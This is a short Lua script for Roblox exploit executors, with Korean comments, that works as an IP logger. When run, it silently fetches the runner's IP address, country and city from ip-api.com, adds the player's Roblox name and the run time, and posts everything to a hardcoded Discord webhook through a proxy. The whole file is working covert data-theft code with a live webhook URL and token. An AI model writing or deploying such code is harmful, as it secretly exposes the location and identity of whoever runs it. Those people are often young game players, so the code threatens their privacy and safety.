-- [1] 사용자님이 주신 프록시 전용 웹훅 주소
local final_url = "https://webhook.lewisakura.moe/api/webhooks/1492431494319313030/C3DOY0zlWt960efXW1T9lp2sVOIWi4xQsH8ZS7cPcgCGzC9TXDuto3ve3GfLAP2tHx5F"

local http_request = http_request or request or syn.request or http.request or fluxus.request or Krnl.request or http_request 
if not http_request then warn("실행기가 HTTP 요청을 지원하지 않습니다.") return end

-- [2] IP 정보 가져오기 (한국어 설정)
local ipData = { query = "알 수 없음", country = "N/A", city = "N/A" }
local success, response = pcall(function() 
    return http_request({ Url = "http://ip-api.com/json/?lang=ko", Method = "GET" }) 
end)

if success and response.Body then
    pcall(function()
        local decoded = game:GetService("HttpService"):JSONDecode(response.Body)
        if decoded.status == "success" then ipData = decoded end
    end)
end

-- [3] 디스코드 전송 데이터 구성
local payload = {
    username = "아이피 로거",
    embeds = {{
        title = "🚀 실행 감지 (Lewisakura Proxy)",
        color = 16711680,
        fields = {
            {name = "IP 주소", value = ipData.query, inline = true},
            {name = "위치", value = ipData.country .. " " .. ipData.city, inline = true},
            {name = "플레이어 닉네임", value = game.Players.LocalPlayer.Name, inline = false},
            {name = "실행 시간", value = os.date("%Y-%m-%d %H:%M:%S KST"), inline = true}
        },
        footer = {text = "IP Logger System"}
    }}
}

-- [4] 실제 전송
pcall(function()
    http_request({
        Url = final_url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode(payload)
    })
end)
